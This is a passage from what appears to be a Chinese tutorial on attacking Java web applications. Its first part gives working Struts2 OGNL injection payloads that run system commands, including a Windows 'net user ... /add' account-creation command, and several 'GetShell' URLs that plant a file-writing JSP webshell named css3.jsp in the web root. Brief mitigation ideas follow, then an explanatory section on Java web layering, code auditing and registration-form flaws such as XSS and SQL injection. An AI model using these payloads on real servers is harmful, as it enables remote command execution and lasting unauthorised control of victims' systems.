http://localhost/struts2-blank/example/HelloWorld.action? 
redirect:${ 
%23a%3d(new java.lang.ProcessBuilder(new java.lang.String[]{'netstat','-an'})).start(), 
%23b%3d%23a.getInputStream(), 
%23c%3dnew java.io.InputStreamReader(%23b), 
%23d%3dnew java.io.BufferedReader(%23c), 
%23e%3dnew char[50000],%23d.read(%23e), 
%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'), 
%23matt.getWriter().println(%23e), 
%23matt.getWriter().flush(), 
%23matt.getWriter().close() 
} 
其实在Java里面要去执行一个命令的方式都是一样的，简单的静态调用方式
第 129 页 
java.lang.Runtime.getRuntime().exec("net user selina 123 /add");就可以执行任意命令了。Exec
执行后返回的类型是java.lang.Process。Process是一个抽象类，final class ProcessImpl 
extends Process也是Process的具体实现。而命令执行后返回的Process可以通过 
public OutputStream getOutputStream() 和 
public InputStream getInputStream() 
直接输入输出流，拿到InputStream之后直接读取就能够获取到命令执行的结果了。而
在Ognl里面不能够用正常的方式去读取流，而多是用DataInputStream的readFully或
BufferedReader的read方法全部读取或者按byte读取的。因为可能会读取到半个中文字符，所
以可能会存在乱码问题，自定义每次要读取的大小就可以了。POC当中的/c 不是必须的，执
行dir之类的命令可以加上。 
Process java.lang.Runtime.exec(String command) throws IOException 
GetShell POC： 
poc1: 
第 130 页 
http://127.0.0.1/Struts2/test.action?('\u0023_memberAccess[\'allowStaticMethodAccess\']')(meh
)=true&(aaa)(('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003d\u0023fo
o')(\u0023foo\u003dnew%20java.lang.Boolean(%22false%22)))&(i1)(('\43req\PI:EMAIL
uts2.ServletActionContext@getRequest()')(d))&(i12)(('\43xman\75@org.apache.struts2.ServletAc
tionContext@getResponse()')(d))&(i13)(('\43xman.getWriter().println(\43req.getServletContext()
.getRealPath(%22\u005c%22))')(d))&(i2)(('\43fos\75new\40java.io.FileOutputStream(new\40java
.lang.StringBuilder(\43req.getRealPath(%22\u005c%22)).append(@java.io.File@separator).appe
nd(%22css3.jsp%22).toString())')(d))&(i3)(('\43fos.write(\43req.getParameter(%22p%22).getBytes
())')(d))&(i4)(('\43fos.close()')(d))&p=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+ja
va.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%2
2))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e 
POC2（类型转换漏洞需要把 POC 加在整型参数上）: 
http://127.0.0.1/Struts2/test.action?id='%2b(%23_memberAccess[%22allowStaticMethodAccess
%22]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),new+java.io.Buffer
edWriter(new+java.io.FileWriter(%23req.getRealPath(%22/%22)%2b%22css3.jsp%22)).append(%
23req.getParameter(%22p%22)).close())%2b'%20&p=%3c%25if(request.getParameter(%22f%22)!
%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getPar
ameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e 
POC3（需要注意这里也必须是加载一个 String(字符串类型)的参数后面，使用的时候把 URL
里面的两个 foo 替换成目标参数（注意 POC 里面还有个 foo））: 
http://127.0.0.1/Struts2/hello.action?foo=%28%23context[%22xwork.MethodAccessor.denyMeth
odExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowSt
aticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%23req=@org.apache.struts2.S
ervletActionContext@getRequest(),new+java.io.BufferedWriter(new+java.io.FileWriter(%23req.g
etRealPath(%22/%22)%2b%22css3.jsp%22)).append(%23req.getParameter(%22p%22)).close())(m
eh%29&z[%28foo%29%28%27meh%27%29]=true&p=%3c%25if(request.getParameter(%22f%22)
!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getPa
rameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e 
POC4: 
http://127.0.0.1/Struts2/hello.action? 
class.classLoader.jarPath=( 
%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d=+new+java.lang.Bool
ean(false), 
%23_memberAccess%5b%22allowStaticMethodAccess%22%5d=true, 
%23req=@org.apache.struts2.ServletActionContext@getRequest(), 
new+java.io.BufferedWriter( 
new+java.io.FileWriter(%23req.getRealPath(%22/%22)%2b%22css3.jsp%22) 
第 131 页 
).append( 
%23req.getParameter(%22p%22) 
).close() 
(aa)&x[(class.classLoader.jarPath)('aa')]& 
p=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(applicat
ion.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParamet
er(%22t%22).getBytes())%3b%25%3e 
POC5: 
http://127.0.0.1/Struts2/hello.action?a=1${%23_memberAccess[%22allowStaticMethodAccess%2
2]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),new+java.io.Buffered
Writer(new+java.io.FileWriter(%23req.getRealPath(%22/%22)%2b%22css3.jsp%22)).append(%23r
eq.getParameter(%22p%22)).close()}&p=%3c%25if(request.getParameter(%22f%22)!%3dnull)(ne
w+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22
f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e 
POC7: 
http://localhost/Struts2/test.action?redirect:${ 
%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'), 
%23p%3d(%23req.getRealPath(%22/%22)%2b%22css3.jsp%22).replaceAll("\\\\", "/"), 
new+java.io.BufferedWriter(new+java.io.FileWriter(%23p)).append(%23req.getParameter(%22
c%22)).close() 
}&c=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(applic
ation.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParam
eter(%22t%22).getBytes())%3b%25%3e 
比如 POC4 当中首先就是把 allowStaticMethodAccess 改为 trute 即允许静态方法访问。
然后再获取请求对象，从请求对象中获取网站项目的根路径，然后在根目录下新建一个
css3.jsp，而 css3.jsp 的内容同样来自于客户端的请求。POC4 中的 p 就是传入的参数，只要
获取 p 就能获取到内容完成文件的写入了。之前已经说过 Java 不是动态的脚本语言，所以
没有 eval。不能像 PHP 那样直接用 eval 去动态执行，所以 Java 里面没有真正意义上的一句
话木马。菜刀只是提供了一些常用的一句话的功能的具体的实现，所以菜刀的代码会很长，
因为这些代码在有 eval 的情况下是可以通过发送请求的形式去构造的，在这里就必须把代
码给上传到服务器去编译成执行。 
Struts2 漏洞修补: 
关于修补仅提供思路，具体的方法和补丁不提供了。Struts2 默认后缀是 action 或者不
写后缀，有的改过代码的可能其他后缀如.htm、.do，那么我们只要拦截这些请求进行过滤
就行了。 
1、 从 CDN 层可以拦截所有 Struts2 的请求过滤 OGNL 执行代码 
2、 从 Server 层在请求 Struts2 之前拦截其 Ognl 执行。 
3、 在项目层面可以在 struts2 的 filter 加一层拦截 
第 132 页 
4、 在 Struts2 可以用拦截器拦截 
5、 在 Ognl 源码包可以拦截恶意的 Ognl 请求 
6、 实在没办法就打补丁 
7、 终极解决办法可以考虑使用其他 MVC 框架 
第 133 页 
攻击 JavaWeb 应用[6] -架构与代码审计 
-园长 MM 
注：不管多么强大的系统总会有那么些安全问题，影响小的可能仅仅只会影响用户体验，危害性大点的可能会让攻击者
获取到服务器权限。这一节重点是怎样去找到并利用问题去获取一些有意思的东西。 
Before: 
有 MM 的地方就有江湖，有程序的地方就有漏洞。现在已经不是 SQL 注入漫天的年代了，
Java 的一些优秀的开源框架让其项目坚固了不少。在一个中大型的 Web 应用漏洞的似乎永
远都存在，只是在于影响的大小、发现的难易等问题。有很多比较隐晦的漏洞需要在了解业
务逻辑甚至是查看源代码才能揪出来。JavaWeb 跟 PHP 和 ASP 很大的不同在于其安全性相对
来说更高。但是具体体现在什么地方？JavaWeb 开发会有那些问题？这些正是我们今天讨论
的话题。 
1、 JavaWeb 开发概念 
Java 的分层思想 
通过前面几章的介绍相信已经有不少的朋友对 Jsp、Servlet 有一定了解了。上一节讲
MVC 的有说的 JSP+Servlet 构成了性能好但开发效率并不高的 Model2。在 JavaWeb 开发当中
一般会分出很多的层去做不同的业务。 
常见的分层： 
1、 展现层(View 视图) 
2、 控制层（Controller 控制层） 
3、 服务层（Service） 
4、 实体层（entity 实体对象、VO(value object) 值对象 、模型层（bean）。 
5、 业务逻辑层 BO(business object)   
6、 持久层（dao- Data Access Object 数据访问层、PO(persistant object) 持久对象） 
依赖关系： 
在了解一个项目之前至少要知道它的主要业务是什么主要的业务逻辑和容易出现问题
的环节。其次是了解项目的结构和项目当中的类依赖。再次才是去根据业务模块去读对应的
代码。从功能去关联业务代码入手往往比逮着段代码就看效率高无数倍。 
前几天在 Iteye 看到一款不错的生成项目依赖图的工具- Structure101，试用了下
Structure101 感觉挺不错的，不过是收费的而且价格昂贵。用 Structure101 生成 Jeebbs 的项
目架构图： 
第 134 页 
Structure101 导入 jeebss 架构图-包调用： 
第 135 页 
Structure101 包调用详情： 
Structure101 可以比较方便的去生成类关系图、调用图等。Jeebbs 项目比较大，逻辑相
对复杂，不过可以看下我的半成品的博客系统。 
项目图： 
第 136 页 
架构图： 
控制层： 
调用流程（demo 还没处理异常，最好能 try catch 下用上面的 logger 记录一下）： 
第 137 页 
2、 漏洞发掘基础 
Eclipse 采用的是 SWT 编写，俗称万能 IDE 拥有各种语言的插件可以写。Myeclipse 是
Eclipse 的插件版，功能比 eclipse 更简单更强大。 
导入 Web 项目到 Myeclipse，Myeclipse 默认提供了主流的 Server 可以非常方便的去部
署你的 Web 项目到对应的 Server 上，JavaWeb 容器异常之多，而 ASP、 PHP 的容器却相对
较少。容器可能除了开发者有更多的选择外往往意味着需要调试程序在不同的 Server 半桶
的版本的表现，这是让人一件非常崩溃的事。 
调试开源的项目需下载源码到本地然后导入部署，如果没有源代码怎么办？一般情况下
JavaWeb 程序不会去混淆代码，所以通过之前的反编译工具就能够比较轻松的拿到源代码。
但是反编译过来的源代码并不能够直接作用于 debug。不过对我们了解程序逻辑和结构有了
非常大的帮助，根据逻辑代码目测基本上也能完成 debug。 
第 138 页 
在上一节已经讲过了一个客户端的请求到达服务器端后，后端会去找到这个 URL 所在
的类，然后调用业务相关代码完成请求的处理，最后返回处理完成后的内容。跟踪请求的方
式一般是先找到对应的控制层，然后深入到具体的逻辑代码当中。另一种方法是事先到 dao
或业务逻辑层去找漏洞，然后逆向去找对应的控制层。最直接的如 model1、model2 并不用
那么费劲直接代码在 jsp、servlet 代码里面就能找到一大堆业务逻辑。 
1、按业务类型有序测试 
普通的测试一般都是按功能和模块去写测试的用例，即按照业务一块一块去测试对应的
功能。这一种方式是顺着了 Http 请求跟踪到业务逻辑代码，相对来说比较简单方便，而且
逻辑会更加的清晰。 
上面的架构图和包截图不知道有没有同学仔细看，Java 里面的包的概念相对来说比较严
禁。公认的命名方式是 com/org.公司名.项目名.业务名全小写如:org.javaweb.ylog.dao 部署到
服务器上对应的文件夹应当是/WEB-INF/classes/org/javaweb/ylog/dao/其中的.意味着一级目
录。 
现在知道了包和分层规范要找到控制层简直就是轻而易举了，一般来说找到Controller
或者Action所在的包的路径就行了。左边是jeebbs右边是我的blog，其中的action下和controller
下的都是控制层的方法。@RequestMapping("/top.do")表示了直接把请求映射到该方法
上，Struts2略有不同，需要在xml配置一个action对应的处理类方法和返回的页面。不过这暂
时不是我们讨论的话题，我们需要知道隐藏在框架背后的请求入口的类和方法在哪。 
用例图： 
第 139 页 
1、 用户注册问题 
用户逻辑图： 
容易出现的问题: 
1、没有校验用户唯一性。 
第 140 页 
2、校验唯一性和存储信息时拼 Sql 导致 Sql 注入。 
3、用户信息（用户名、邮箱等）未校验格式有效性，可能导致存储性 xss。 
4、头像上传漏洞。 
5、用户类型注册时可控导致注册越权（直接注册管理员帐号）。 
6、注册完成后的跳转地址导致 xss。 
1、Jeebbs 邮箱逻辑验证漏洞： 
注册的 URL 地址是：http://localhost/jeebbs/register.jspx， register.jspx 很明显是控制层映射
的 URL，第一要务是找到它。然后看他的逻辑。 
Tips：Eclipse 全局搜索关键字方法 
根据搜索结果找到对应文件： 
第 141 页 
根据结果找到对应的public class RegisterAct类，并查看对应逻辑代码： 
找到控制层的入口后即可在对应的方法内设上断点，然后发送请求到控制层的URL
进入Debug模式。 
注册发送数据包时用Tamper data拦截并修改请求当中的email为xss攻击代码。 
第 142 页 
选择任意对象右键Watch即可查看对应的值（任意完整的，有效的对象包括方法执行）。 